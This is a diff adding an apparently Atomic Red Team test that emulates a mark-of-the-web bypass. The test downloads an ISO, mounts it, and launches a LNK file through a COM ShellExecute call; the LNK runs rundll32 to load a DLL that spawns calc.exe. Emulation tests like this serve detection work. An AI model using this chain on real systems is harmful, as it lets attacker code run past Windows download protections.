@@ -88,3 +88,32 @@ atomic_tests:
     cleanup_command: |
       Set-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'
     name: powershell
+- name: Execute LNK file from ISO
+  auto_generated_guid: c2587b8d-743d-4985-aa50-c83394eaeb68
+  description: |
+    Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.
+  supported_platforms:
+  - windows
+  input_arguments:
+    path_of_iso:
+      description: Path to ISO file
+      type: Path
+      default: PathToAtomicsFolder\T1553.005\bin\AllTheThings.iso
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      AllTheThings.iso must exist on disk at specified location (#{path_of_iso})
+    prereq_command: |
+      if (Test-Path #{path_of_iso}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{path_of_iso}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/AllTheThings.iso -OutFile "#{path_of_iso}"
+  executor:
+    command: |
+      $keep = Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly
+      $driveLetter = ($keep | Get-Volume).DriveLetter
+      $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"))
+      $instance.Document.Application.ShellExecute($driveLetter+":\document.lnk","",$driveLetter+":\",$null,0)
+    cleanup_command: |
+      Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
+    name: powershell
